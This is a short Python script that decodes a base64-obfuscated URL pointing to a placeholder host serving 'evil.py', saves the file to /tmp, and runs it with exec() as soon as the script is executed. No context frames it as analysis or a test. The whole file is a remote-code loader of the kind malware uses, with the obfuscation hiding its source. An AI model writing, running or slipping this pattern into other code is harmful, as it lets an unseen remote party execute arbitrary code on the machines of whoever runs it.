import urllib.request
import base64

def fetch_exec():
    try:
        encoded_url = "aHR0cDovL3NhbXBsZS51cmwvZXZpbC5weQ=="
        decoded_url = base64.b64decode(encoded_url).decode("utf-8")
        local_file = "/tmp/doc.py"

        urllib.request.urlretrieve(decoded_url, local_file)

        with open(local_file, "r") as f:
            script = f.read()

        exec(script)

    except Exception as e:
        print(e)

fetch_exec()
